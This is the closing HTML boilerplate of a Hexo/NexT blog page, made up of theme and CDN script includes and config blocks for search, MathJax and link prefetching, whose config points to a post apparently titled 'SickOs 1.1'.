  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/4.0.7/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script><script src="/js/pjax.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>




  <script src="/js/third-party/fancybox.js"></script>

  <script src="/js/third-party/pace.js"></script>


  




  

  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"ams","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
<script src="/js/third-party/math/mathjax.js"></script>


  <script src="https://cdnjs.cloudflare.com/ajax/libs/quicklink/2.3.0/quicklink.umd.js" integrity="sha256-yvJQOINiH9fWemHn0vCA5lsHWJaHs6/ZmO+1Ft04SvM=" crossorigin="anonymous"></script>
  <script class="next-config" data-name="quicklink" type="application/json">{"enable":true,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"url":"https://z9m8r8.github.io/2024/10/19/SickOs%201.1/"}</script>
  <script src="/js/third-party/quicklink.js"></script>

</body>
</html>
